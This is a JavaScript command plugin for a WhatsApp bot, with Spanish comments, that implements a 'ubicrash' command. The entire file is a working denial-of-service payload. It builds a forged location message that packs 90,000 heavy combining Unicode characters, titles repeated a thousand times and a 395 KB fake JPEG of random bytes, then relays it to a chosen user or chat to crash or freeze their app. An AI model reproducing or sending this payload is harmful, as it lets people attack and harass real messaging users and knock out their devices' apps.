import fetch from 'node-fetch'

let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  if (jid === conn.user.id) {
    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
  }

  const objetivo = jid;

  // 🧨 Caracteres maliciosos proporcionados
  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵';
  const totalCaracteres = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);

  // 🖼️ Crea una imagen JPEG falsa con bytes aleatorios (aprox 395 KB)
  const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]); // JPEG header
  const aleatorio = Buffer.alloc(395 * 1024 - header.length);
  for (let i = 0; i < aleatorio.length; i++) aleatorio[i] = Math.floor(Math.random() * 256);
  const thumbnailPesado = Buffer.concat([header, aleatorio]);

  // 📦 Construir el mensaje
  const fakeLoc = {
    key: {
      fromMe: false,
      participant: "0@s.whatsapp.net",
      ...(m.chat ? { remoteJid: "status@broadcast" } : {})
    },
    message: {
      locationMessage: {
        name: 'Tobi',
        degreesLatitude: 19.432608,
        degreesLongitude: -99.133209,
        address: totalCaracteres,
        jpegThumbnail: thumbnailPesado,
        isLive: false,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '𑇂'.repeat(1000),
            body: '𑆿𑆿𑆿'.repeat(1000),
            thumbnail: thumbnailPesado,
            sourceUrl: 'https://youtube.com/@p.a.zinwebkkkkj'
          }
        }
      }
    }
  };

  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() });
};

handler.command = /^ubicrash$/i;
handler.owner = true;

export default handler;